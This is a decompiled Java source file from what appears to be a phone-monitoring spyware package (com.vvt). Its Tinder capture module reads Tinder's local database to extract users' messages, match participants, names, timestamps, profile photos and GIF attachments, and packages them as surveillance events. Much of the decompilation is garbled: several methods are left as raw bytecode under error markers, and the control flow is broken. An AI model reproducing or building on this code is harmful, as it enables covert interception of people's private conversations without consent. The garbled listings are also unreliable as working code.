package com.vvt.capture.tinder;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.f;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.TimeZone;

public class b
{
  private static final String a = b.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static long a()
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = false;
    long l = a(null);
    boolean bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    return l;
  }
  
  /* Error */
  public static long a(int paramInt, String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_2
    //   3: dconst_0
    //   4: dconst_0
    //   5: ddiv
    //   6: dstore 4
    //   8: aconst_null
    //   9: astore 6
    //   11: aload_1
    //   12: invokestatic 40	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   15: istore 7
    //   17: iload 7
    //   19: ifeq +7 -> 26
    //   22: invokestatic 44	com/vvt/n/a/f/a:a	()Ljava/lang/String;
    //   25: astore_1
    //   26: aload_1
    //   27: invokestatic 40	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   30: istore 7
    //   32: iload 7
    //   34: ifne +309 -> 343
    //   37: aload_1
    //   38: invokestatic 49	com/vvt/capture/tinder/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   41: astore 8
    //   43: aload 8
    //   45: ifnull +289 -> 334
    //   48: iconst_m1
    //   49: istore 9
    //   51: iload_0
    //   52: iload 9
    //   54: if_icmpeq +280 -> 334
    //   57: ldc 53
    //   59: astore 10
    //   61: iconst_0
    //   62: istore 11
    //   64: aconst_null
    //   65: astore 12
    //   67: aconst_null
    //   68: astore 13
    //   70: iconst_0
    //   71: istore 14
    //   73: ldc 51
    //   75: astore 15
    //   77: iload_0
    //   78: invokestatic 59	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   81: astore 16
    //   83: aload 8
    //   85: aload 10
    //   87: aconst_null
    //   88: aconst_null
    //   89: aconst_null
    //   90: aconst_null
    //   91: aconst_null
    //   92: aload 15
    //   94: aload 16
    //   96: invokevirtual 65	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   99: astore 10
    //   101: aload 10
    //   103: ifnull +221 -> 324
    //   106: aload 10
    //   108: invokeinterface 71 1 0
    //   113: istore 11
    //   115: iload 11
    //   117: ifeq +81 -> 198
    //   120: ldc 73
    //   122: astore 12
    //   124: aload 10
    //   126: aload 12
    //   128: invokeinterface 77 2 0
    //   133: istore 11
    //   135: aload 10
    //   137: iload 11
    //   139: invokeinterface 80 2 0
    //   144: astore 12
    //   146: aload 12
    //   148: invokestatic 82	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	(Ljava/lang/String;)J
    //   151: lstore_2
    //   152: aload 10
    //   154: astore 13
    //   156: lload_2
    //   157: lstore 17
    //   159: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   162: istore 14
    //   164: iload 14
    //   166: ifeq +3 -> 169
    //   169: aload 13
    //   171: ifnull +10 -> 181
    //   174: aload 13
    //   176: invokeinterface 85 1 0
    //   181: aload 8
    //   183: ifnull +8 -> 191
    //   186: aload 8
    //   188: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   191: lload 17
    //   193: lstore 19
    //   195: lload 19
    //   197: lreturn
    //   198: lconst_0
    //   199: lstore_2
    //   200: dconst_0
    //   201: dstore 4
    //   203: aload 10
    //   205: astore 13
    //   207: lload_2
    //   208: lstore 17
    //   210: goto -51 -> 159
    //   213: astore 10
    //   215: aconst_null
    //   216: astore 13
    //   218: iconst_m1
    //   219: i2l
    //   220: lstore 17
    //   222: getstatic 28	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	Z
    //   225: istore 14
    //   227: iload 14
    //   229: ifeq +3 -> 232
    //   232: aload 13
    //   234: ifnull +10 -> 244
    //   237: aload 13
    //   239: invokeinterface 85 1 0
    //   244: aload 8
    //   246: ifnull +8 -> 254
    //   249: aload 8
    //   251: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   254: lload 17
    //   256: lstore 19
    //   258: goto -63 -> 195
    //   261: astore 10
    //   263: aload 6
    //   265: ifnull +10 -> 275
    //   268: aload 6
    //   270: invokeinterface 85 1 0
    //   275: aload 8
    //   277: ifnull +8 -> 285
    //   280: aload 8
    //   282: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   285: aload 10
    //   287: athrow
    //   288: astore 12
    //   290: aload 10
    //   292: astore 6
    //   294: aload 12
    //   296: astore 10
    //   298: goto -35 -> 263
    //   301: astore 10
    //   303: aload 13
    //   305: astore 6
    //   307: goto -44 -> 263
    //   310: astore 12
    //   312: aload 10
    //   314: astore 13
    //   316: goto -98 -> 218
    //   319: astore 10
    //   321: goto -103 -> 218
    //   324: aload 10
    //   326: astore 13
    //   328: lload_2
    //   329: lstore 17
    //   331: goto -172 -> 159
    //   334: aconst_null
    //   335: astore 13
    //   337: lload_2
    //   338: lstore 17
    //   340: goto -181 -> 159
    //   343: lload_2
    //   344: lstore 19
    //   346: goto -151 -> 195
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	349	0	paramInt	int
    //   0	349	1	paramString	String
    //   2	342	2	l1	long
    //   6	196	4	d	double
    //   9	297	6	localObject1	Object
    //   15	18	7	bool1	boolean
    //   41	240	8	localSQLiteDatabase	SQLiteDatabase
    //   49	6	9	i	int
    //   59	145	10	localObject2	Object
    //   213	1	10	localException1	Exception
    //   261	30	10	localObject3	Object
    //   296	1	10	localObject4	Object
    //   301	12	10	localObject5	Object
    //   319	6	10	localException2	Exception
    //   62	54	11	bool2	boolean
    //   133	5	11	j	int
    //   65	82	12	str1	String
    //   288	7	12	localObject6	Object
    //   310	1	12	localException3	Exception
    //   68	268	13	localObject7	Object
    //   71	157	14	bool3	boolean
    //   75	18	15	str2	String
    //   81	14	16	str3	String
    //   157	182	17	l2	long
    //   193	152	19	l3	long
    // Exception table:
    //   from	to	target	type
    //   77	81	213	java/lang/Exception
    //   94	99	213	java/lang/Exception
    //   77	81	261	finally
    //   94	99	261	finally
    //   106	113	288	finally
    //   126	133	288	finally
    //   137	144	288	finally
    //   146	151	288	finally
    //   159	162	301	finally
    //   222	225	301	finally
    //   106	113	310	java/lang/Exception
    //   126	133	310	java/lang/Exception
    //   137	144	310	java/lang/Exception
    //   146	151	310	java/lang/Exception
    //   159	162	319	java/lang/Exception
  }
  
  /* Error */
  public static long a(String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: iconst_0
    //   4: istore_3
    //   5: aconst_null
    //   6: astore 4
    //   8: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   11: istore 5
    //   13: iload 5
    //   15: ifeq +3 -> 18
    //   18: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   21: istore 5
    //   23: iload 5
    //   25: ifeq +3 -> 28
    //   28: aload_0
    //   29: invokestatic 40	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   32: istore 5
    //   34: iload 5
    //   36: ifeq +7 -> 43
    //   39: invokestatic 44	com/vvt/n/a/f/a:a	()Ljava/lang/String;
    //   42: astore_0
    //   43: aload_0
    //   44: invokestatic 40	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   47: istore 5
    //   49: iload 5
    //   51: ifne +206 -> 257
    //   54: aload_0
    //   55: invokestatic 49	com/vvt/capture/tinder/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   58: astore 6
    //   60: aload 6
    //   62: ifnull +69 -> 131
    //   65: invokestatic 90	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	()Ljava/lang/String;
    //   68: astore 7
    //   70: aload 6
    //   72: aload 7
    //   74: aconst_null
    //   75: invokevirtual 94	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   78: astore 4
    //   80: aload 4
    //   82: ifnull +49 -> 131
    //   85: aload 4
    //   87: invokeinterface 97 1 0
    //   92: istore 8
    //   94: iload 8
    //   96: ifeq +75 -> 171
    //   99: ldc 73
    //   101: astore 7
    //   103: aload 4
    //   105: aload 7
    //   107: invokeinterface 77 2 0
    //   112: istore 8
    //   114: aload 4
    //   116: iload 8
    //   118: invokeinterface 80 2 0
    //   123: astore 7
    //   125: aload 7
    //   127: invokestatic 82	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	(Ljava/lang/String;)J
    //   130: lstore_1
    //   131: aload 4
    //   133: ifnull +10 -> 143
    //   136: aload 4
    //   138: invokeinterface 85 1 0
    //   143: aload 6
    //   145: ifnull +8 -> 153
    //   148: aload 6
    //   150: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   153: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   156: istore_3
    //   157: iload_3
    //   158: ifeq +3 -> 161
    //   161: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   164: istore_3
    //   165: iload_3
    //   166: ifeq +3 -> 169
    //   169: lload_1
    //   170: lreturn
    //   171: lconst_0
    //   172: lstore_1
    //   173: goto -42 -> 131
    //   176: astore 6
    //   178: iconst_0
    //   179: istore 5
    //   181: aconst_null
    //   182: astore 6
    //   184: getstatic 28	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	Z
    //   187: istore 8
    //   189: iload 8
    //   191: ifeq +3 -> 194
    //   194: aload 4
    //   196: ifnull +10 -> 206
    //   199: aload 4
    //   201: invokeinterface 85 1 0
    //   206: aload 6
    //   208: ifnull -55 -> 153
    //   211: goto -63 -> 148
    //   214: astore 9
    //   216: iconst_0
    //   217: istore 5
    //   219: aconst_null
    //   220: astore 6
    //   222: aload 4
    //   224: ifnull +10 -> 234
    //   227: aload 4
    //   229: invokeinterface 85 1 0
    //   234: aload 6
    //   236: ifnull +8 -> 244
    //   239: aload 6
    //   241: invokevirtual 86	android/database/sqlite/SQLiteDatabase:close	()V
    //   244: aload 9
    //   246: athrow
    //   247: astore 9
    //   249: goto -27 -> 222
    //   252: astore 7
    //   254: goto -70 -> 184
    //   257: iconst_0
    //   258: istore 5
    //   260: aconst_null
    //   261: astore 6
    //   263: goto -132 -> 131
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	266	0	paramString	String
    //   2	171	1	l	long
    //   4	162	3	bool1	boolean
    //   6	222	4	localCursor	Cursor
    //   11	248	5	bool2	boolean
    //   58	91	6	localSQLiteDatabase	SQLiteDatabase
    //   176	1	6	localException1	Exception
    //   182	80	6	localObject1	Object
    //   68	58	7	str	String
    //   252	1	7	localException2	Exception
    //   92	3	8	bool3	boolean
    //   112	5	8	i	int
    //   187	3	8	bool4	boolean
    //   214	31	9	localObject2	Object
    //   247	1	9	localObject3	Object
    // Exception table:
    //   from	to	target	type
    //   28	32	176	java/lang/Exception
    //   39	42	176	java/lang/Exception
    //   43	47	176	java/lang/Exception
    //   54	58	176	java/lang/Exception
    //   28	32	214	finally
    //   39	42	214	finally
    //   43	47	214	finally
    //   54	58	214	finally
    //   65	68	247	finally
    //   74	78	247	finally
    //   85	92	247	finally
    //   105	112	247	finally
    //   116	123	247	finally
    //   125	130	247	finally
    //   184	187	247	finally
    //   65	68	252	java/lang/Exception
    //   74	78	252	java/lang/Exception
    //   85	92	252	java/lang/Exception
    //   105	112	252	java/lang/Exception
    //   116	123	252	java/lang/Exception
    //   125	130	252	java/lang/Exception
  }
  
  private static com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase, String paramString, Cursor paramCursor)
  {
    boolean bool1 = b;
    if (bool1) {}
    localObject1 = new com/vvt/im/events/info/d;
    ((com.vvt.im.events.info.d)localObject1).<init>();
    bool1 = false;
    localObject2 = null;
    try
    {
      String str1 = e();
      int i = 2;
      Object localObject3 = new String[i];
      int j = 0;
      String str2 = null;
      int k = 0;
      Object localObject4 = null;
      localObject4 = String.valueOf(0);
      localObject3[0] = localObject4;
      j = 1;
      k = 1;
      localObject4 = String.valueOf(k);
      localObject3[j] = localObject4;
      localObject2 = paramSQLiteDatabase.rawQuery(str1, (String[])localObject3);
      boolean bool3;
      int m;
      boolean bool2;
      boolean bool4;
      if ((localObject2 == null) || (localObject1 != null)) {
        ((Cursor)localObject1).close();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException = localException;
        bool4 = c;
        if ((bool4) && (localObject2 == null)) {}
      }
    }
    finally
    {
      localObject1 = null;
      localObject2 = localObject5;
    }
    throw ((Throwable)localObject2);
  }
  
  private static com.vvt.im.events.info.e a(SQLiteDatabase paramSQLiteDatabase, String paramString1, Cursor paramCursor, String paramString2, TinderData.Direction paramDirection)
  {
    boolean bool1 = false;
    boolean bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a(paramString2);
    if (!bool2) {}
    Object localObject3;
    Object localObject4;
    for (;;)
    {
      try
      {
        localObject1 = TinderData.Direction.IN;
        if (paramDirection == localObject1)
        {
          localObject1 = "participant_name";
          i = paramCursor.getColumnIndex((String)localObject1);
          localObject3 = paramCursor.getString(i);
          localObject1 = b(paramSQLiteDatabase, paramString2);
          localObject4 = ImMediaFileType.USER_PROFILE;
          localObject1 = a((String)localObject1, paramString1, (ImMediaFileType)localObject4);
          localObject4 = localObject3;
          localObject3 = localObject1;
          localObject1 = new com/vvt/im/events/info/e;
          ((com.vvt.im.events.info.e)localObject1).<init>();
        }
      }
      catch (Exception localException1)
      {
        Object localObject1;
        boolean bool4;
        int i = 0;
        localObject2 = null;
      }
      try
      {
        ((com.vvt.im.events.info.e)localObject1).d(paramString2);
        ((com.vvt.im.events.info.e)localObject1).c((String)localObject4);
        ((com.vvt.im.events.info.e)localObject1).a((String)localObject3);
        bool1 = b;
        if (bool1) {}
        return (com.vvt.im.events.info.e)localObject1;
      }
      catch (Exception localException2)
      {
        boolean bool3;
        for (;;) {}
        localObject4 = localObject3;
        localObject3 = null;
      }
      localObject1 = "participant_name";
      i = paramCursor.getColumnIndex((String)localObject1);
      localObject3 = paramCursor.getString(i);
      localObject1 = b(paramSQLiteDatabase, paramString2);
      bool4 = com.vvt.ag.b.a((String)localObject1);
      if (!bool4)
      {
        localObject4 = ImMediaFileType.USER_PROFILE;
        localObject1 = a((String)localObject1, paramString1, (ImMediaFileType)localObject4);
        localObject4 = localObject3;
        localObject3 = localObject1;
        continue;
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
        bool3 = c;
        if (bool3) {}
        bool3 = false;
        Object localObject2 = null;
        continue;
      }
    }
  }
  
  private static f a(SQLiteDatabase paramSQLiteDatabase, String paramString1, Cursor paramCursor, TinderData.Direction paramDirection, com.vvt.im.events.info.d paramd, String paramString2)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = TinderData.Direction.IN;
    String str;
    Object localObject2;
    if (paramDirection == localObject1)
    {
      int i = paramCursor.getColumnIndex("participant_name");
      str = paramCursor.getString(i);
      localObject1 = b(paramSQLiteDatabase, paramString2);
      localObject2 = ImMediaFileType.USER_PROFILE;
    }
    for (localObject1 = a((String)localObject1, paramString1, (ImMediaFileType)localObject2);; localObject1 = paramd.g())
    {
      localObject2 = new com/vvt/im/events/info/f;
      ((f)localObject2).<init>();
      ((f)localObject2).a(paramString2);
      ((f)localObject2).b(str);
      ((f)localObject2).e((String)localObject1);
      boolean bool2 = b;
      if (bool2) {}
      return (f)localObject2;
      str = paramd.a();
    }
  }
  
  private static String a(long paramLong)
  {
    Date localDate = new java/util/Date;
    localDate.<init>(paramLong);
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    localSimpleDateFormat.<init>("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
    return localSimpleDateFormat.format(localDate);
  }
  
  private static String a(SQLiteDatabase paramSQLiteDatabase, Cursor paramCursor, String paramString)
  {
    int i = paramCursor.getColumnIndex("participant_name");
    String str = paramCursor.getString(i);
    boolean bool2 = com.vvt.ag.b.a(str);
    if (bool2)
    {
      i = paramCursor.getColumnIndex("their_group_id");
      str = paramCursor.getString(i);
      boolean bool1 = com.vvt.ag.b.a(str);
      if (!bool1) {
        break label65;
      }
    }
    label65:
    for (str = "My Group";; str = b(paramSQLiteDatabase, paramCursor, paramString)) {
      return str;
    }
  }
  
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    int i = 1;
    int j = 0;
    String str1 = "";
    String[] arrayOfString = new String[i];
    arrayOfString[0] = paramString;
    Cursor localCursor = paramSQLiteDatabase.rawQuery("SELECT * FROM users WHERE id = ?", arrayOfString);
    if (localCursor != null)
    {
      j = localCursor.moveToFirst();
      i &= j;
      if (i == 0) {
        break label89;
      }
      i = localCursor.getColumnIndex("first_name");
    }
    label89:
    for (String str2 = localCursor.getString(i);; str2 = str1)
    {
      boolean bool = b;
      if (bool) {}
      return str2;
      i = 0;
      str2 = null;
      break;
    }
  }
  
  private static String a(String paramString1, String paramString2, ImMediaFileType paramImMediaFileType)
  {
    Object localObject = null;
    byte[] arrayOfByte = new byte[0];
    boolean bool = com.vvt.ag.b.a(paramString1);
    if (!bool)
    {
      arrayOfByte = b(paramString1);
      if (arrayOfByte != null)
      {
        int i = arrayOfByte.length;
        if (i > 0)
        {
          localObject = ImType.TINDER;
          localObject = com.vvt.im.a.c.a(paramString2, (ImType)localObject, paramImMediaFileType);
          String str = com.vvt.im.a.c.a(paramImMediaFileType);
          localObject = com.vvt.io.d.a(arrayOfByte, (String)localObject, str);
        }
      }
    }
    bool = b;
    if (bool) {}
    return (String)localObject;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString, Cursor paramCursor, com.vvt.base.b paramb)
  {
    boolean bool1 = b;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    Object localObject1 = "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'";
    localSimpleDateFormat.<init>((String)localObject1);
    for (;;)
    {
      try
      {
        bool1 = paramCursor.moveToLast();
        if (bool1)
        {
          bool1 = b;
          if (bool1) {}
          bool1 = b;
          if (bool1) {}
          localObject1 = MessageType.Text;
          int i = ((MessageType)localObject1).getNumber();
          com.vvt.im.events.info.d locald = a(paramSQLiteDatabase, paramString, paramCursor);
          TinderData localTinderData = new com/vvt/capture/tinder/TinderData;
          localTinderData.<init>();
          Object localObject2 = new com/vvt/im/events/info/f;
          ((f)localObject2).<init>();
          localObject2 = new com/vvt/im/events/info/b;
          ((com.vvt.im.events.info.b)localObject2).<init>();
          com.vvt.im.events.info.c localc = new com/vvt/im/events/info/c;
          localc.<init>();
          localObject2 = new java/util/ArrayList;
          ((ArrayList)localObject2).<init>();
          ArrayList localArrayList2 = new java/util/ArrayList;
          localArrayList2.<init>();
          localObject2 = "text";
          int k = paramCursor.getColumnIndex((String)localObject2);
          str1 = paramCursor.getString(k);
          localObject2 = "participant_id";
          k = paramCursor.getColumnIndex((String)localObject2);
          Object localObject3 = paramCursor.getString(k);
          localObject2 = "created";
          k = paramCursor.getColumnIndex((String)localObject2);
          String str2 = paramCursor.getString(k);
          long l1 = c(str2);
          localObject4 = new java/util/Date;
          ((Date)localObject4).<init>(l1);
          localSimpleDateFormat.format((Date)localObject4);
          localTinderData.a(i);
          localObject1 = "user_id";
          i = paramCursor.getColumnIndex((String)localObject1);
          String str3 = paramCursor.getString(i);
          localObject1 = "type";
          i = paramCursor.getColumnIndex((String)localObject1);
          str4 = paramCursor.getString(i);
          localObject1 = "match_id";
          i = paramCursor.getColumnIndex((String)localObject1);
          localObject5 = paramCursor.getString(i);
          localObject1 = locald.b();
          boolean bool2 = ((String)localObject1).equals(str3);
          if (!bool2) {
            continue;
          }
          localObject4 = TinderData.Direction.OUT;
          bool2 = b;
          if (bool2) {}
          localObject1 = paramSQLiteDatabase;
          localObject2 = paramString;
          Object localObject6 = paramCursor;
          localObject2 = a(paramSQLiteDatabase, paramString, paramCursor, (String)localObject3, (TinderData.Direction)localObject4, (String)localObject5);
          localObject7 = paramSQLiteDatabase;
          Object localObject8 = paramString;
          localObject6 = a(paramSQLiteDatabase, paramString, paramCursor, (TinderData.Direction)localObject4, locald, str3);
          localObject3 = new com/vvt/im/events/info/b;
          ((com.vvt.im.events.info.b)localObject3).<init>();
          localObject1 = "id";
          int j = paramCursor.getColumnIndex((String)localObject1);
          localObject1 = paramCursor.getString(j);
          ((com.vvt.im.events.info.b)localObject3).a((String)localObject1);
          localObject1 = a(paramSQLiteDatabase, paramCursor, (String)localObject5);
          ((com.vvt.im.events.info.b)localObject3).b((String)localObject1);
          j = ((ArrayList)localObject2).size();
          if (j > 0)
          {
            j = 0;
            localObject1 = null;
            localObject1 = ((ArrayList)localObject2).get(0);
            localObject1 = (com.vvt.im.events.info.e)localObject1;
            localObject1 = ((com.vvt.im.events.info.e)localObject1).a();
            ((com.vvt.im.events.info.b)localObject3).c((String)localObject1);
          }
          bool3 = b;
          if (bool3) {}
          bool3 = com.vvt.ag.b.a(str4);
          if (bool3) {
            continue;
          }
          localObject1 = str4.trim();
          localObject5 = "gif";
          bool3 = ((String)localObject1).equals(localObject5);
          if (!bool3)
          {
            localObject1 = str4.trim();
            localObject5 = "0";
            bool3 = ((String)localObject1).equals(localObject5);
            if (!bool3) {
              continue;
            }
          }
          localObject1 = ImMediaFileType.ATTACHMENT;
          localObject1 = a(str1, paramString, (ImMediaFileType)localObject1);
          localObject5 = new com/vvt/im/events/info/a;
          ((com.vvt.im.events.info.a)localObject5).<init>();
          localObject7 = "image/gif";
          ((com.vvt.im.events.info.a)localObject5).b((String)localObject7);
          ((com.vvt.im.events.info.a)localObject5).c((String)localObject1);
          ((com.vvt.im.events.info.a)localObject5).a(str1);
          localArrayList2.add(localObject5);
          bool3 = false;
          localObject1 = null;
          long l2 = d(str2);
          localObject8 = new java/util/Date;
          ((Date)localObject8).<init>(l2);
          localObject8 = localSimpleDateFormat.format((Date)localObject8);
          localTinderData.a(l2);
          localTinderData.b((String)localObject8);
          localTinderData.a(localc);
          localTinderData.a((TinderData.Direction)localObject4);
          localTinderData.a((List)localObject2);
          localTinderData.a(locald);
          localTinderData.a((f)localObject6);
          localTinderData.a((com.vvt.im.events.info.b)localObject3);
          localTinderData.b(localArrayList2);
          localTinderData.a((String)localObject1);
          localArrayList1.add(localTinderData);
          bool3 = b;
          if (bool3) {}
          bool3 = paramCursor.moveToPrevious();
          if (bool3) {
            continue;
          }
        }
      }
      catch (Exception localException)
      {
        String str1;
        Object localObject4;
        String str4;
        Object localObject5;
        Object localObject7;
        boolean bool3 = c;
        if (!bool3) {
          continue;
        }
        continue;
      }
      bool3 = b;
      if (bool3) {}
      return localArrayList1;
      localObject4 = TinderData.Direction.IN;
      continue;
      localObject1 = str4.trim();
      localObject5 = "1";
      bool3 = ((String)localObject1).equals(localObject5);
      if (bool3)
      {
        localObject1 = a;
        localObject5 = new java/lang/StringBuilder;
        ((StringBuilder)localObject5).<init>();
        localObject7 = "keepConversation # No Attachment # type: ";
        localObject5 = ((StringBuilder)localObject5).append((String)localObject7);
        localObject5 = ((StringBuilder)localObject5).append(str4);
        localObject5 = ((StringBuilder)localObject5).toString();
        Log.v((String)localObject1, (String)localObject5);
        localObject1 = str1;
      }
      else
      {
        localObject1 = a;
        localObject5 = new java/lang/StringBuilder;
        ((StringBuilder)localObject5).<init>();
        localObject7 = "keepConversation # Unknow message attachment type: ";
        localObject5 = ((StringBuilder)localObject5).append((String)localObject7);
        localObject5 = ((StringBuilder)localObject5).append(str4);
        localObject5 = ((StringBuilder)localObject5).toString();
        Log.v((String)localObject1, (String)localObject5);
        localObject1 = str1;
        continue;
        localObject1 = a;
        localObject5 = new java/lang/StringBuilder;
        ((StringBuilder)localObject5).<init>();
        localObject7 = "keepConversation # No Attachment # type: ";
        localObject5 = ((StringBuilder)localObject5).append((String)localObject7);
        localObject5 = ((StringBuilder)localObject5).append(str4);
        localObject5 = ((StringBuilder)localObject5).toString();
        Log.v((String)localObject1, (String)localObject5);
        localObject1 = str1;
      }
    }
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, Cursor paramCursor, String paramString2)
  {
    int i = 1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    String[] arrayOfString1 = new String[3];
    arrayOfString1[0] = "user_id";
    arrayOfString1[i] = "match_id";
    int j = 2;
    arrayOfString1[j] = "is_my_group";
    String str1 = "match_id = ? ";
    String[] arrayOfString2 = new String[i];
    arrayOfString2[0] = paramString2;
    String str2 = "match_participant";
    Object localObject = paramSQLiteDatabase;
    localObject = paramSQLiteDatabase.query(str2, arrayOfString1, str1, arrayOfString2, null, null, null);
    if (localObject != null)
    {
      boolean bool2 = ((Cursor)localObject).moveToFirst();
      if (bool2)
      {
        boolean bool3;
        do
        {
          int k = ((Cursor)localObject).getColumnIndex("user_id");
          str2 = ((Cursor)localObject).getString(k);
          localArrayList.add(str2);
          bool3 = ((Cursor)localObject).moveToNext();
        } while (bool3);
      }
    }
    boolean bool1 = b;
    if (bool1) {}
    return localArrayList;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, Cursor paramCursor, String paramString2, TinderData.Direction paramDirection, String paramString3)
  {
    boolean bool1 = b;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    bool1 = com.vvt.ag.b.c(paramString2);
    if (bool1)
    {
      ArrayList localArrayList2 = a(paramSQLiteDatabase, paramString1, paramCursor, paramString3);
      bool1 = false;
      localObject = null;
      int i;
      for (int j = 0;; j = i)
      {
        i = localArrayList2.size();
        if (j >= i) {
          break;
        }
        localObject = (String)localArrayList2.get(j);
        localObject = a(paramSQLiteDatabase, paramString1, paramCursor, (String)localObject, paramDirection);
        if (localObject != null) {
          localArrayList1.add(localObject);
        }
        i = j + 1;
      }
    }
    Object localObject = a(paramSQLiteDatabase, paramString1, paramCursor, paramString2, paramDirection);
    if (localObject != null) {
      localArrayList1.add(localObject);
    }
    boolean bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    return localArrayList1;
  }
  
  /* Error */
  public static ArrayList a(String paramString1, String paramString2, long paramLong1, long paramLong2, com.vvt.base.b paramb)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 7
    //   3: aconst_null
    //   4: astore 8
    //   6: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   9: istore 9
    //   11: iload 9
    //   13: ifeq +3 -> 16
    //   16: new 217	java/util/ArrayList
    //   19: astore 10
    //   21: aload 10
    //   23: invokespecial 218	java/util/ArrayList:<init>	()V
    //   26: lload_2
    //   27: invokestatic 373	com/vvt/capture/tinder/removeFromPath:a	(J)Ljava/lang/String;
    //   30: astore 11
    //   32: lload 4
    //   34: invokestatic 373	com/vvt/capture/tinder/removeFromPath:a	(J)Ljava/lang/String;
    //   37: astore 12
    //   39: aload_1
    //   40: invokestatic 40	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   43: istore 13
    //   45: iload 13
    //   47: ifne +131 -> 178
    //   50: aload_1
    //   51: invokestatic 49	com/vvt/capture/tinder/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   54: astore 14
    //   56: aload 14
    //   58: ifnull +85 -> 143
    //   61: invokestatic 374	com/vvt/capture/tinder/removeFromPath:removeFromPath	()Ljava/lang/String;
    //   64: astore 15
    //   66: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   69: istore 16
    //   71: iload 16
    //   73: ifeq +3 -> 76
    //   76: iconst_2
    //   77: istore 16
    //   79: iload 16
    //   81: anewarray 105	java/lang/String
    //   84: astore 17
    //   86: iconst_0
    //   87: istore 18
    //   89: aload 17
    //   91: iconst_0
    //   92: aload 11
    //   94: aastore
    //   95: iconst_1
    //   96: istore 18
    //   98: aload 17
    //   100: iload 18
    //   102: aload 12
    //   104: aastore
    //   105: aload 14
    //   107: aload 15
    //   109: aload 17
    //   111: invokevirtual 94	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   114: astore 8
    //   116: aload 8
    //   118: ifnull +82 -> 200
    //   121: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   124: istore 19
    //   126: iload 19
    //   128: ifeq +3 -> 131
    //   131: aload 14
    //   133: aload_0
    //   134: aload 8
    //   136: aload 6
    //   138: invokestatic 377	com/vvt/capture/tinder/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Landroid/database/Cursor;Lcom/vvt/base/removeFromPath;)Ljava/util/ArrayList;
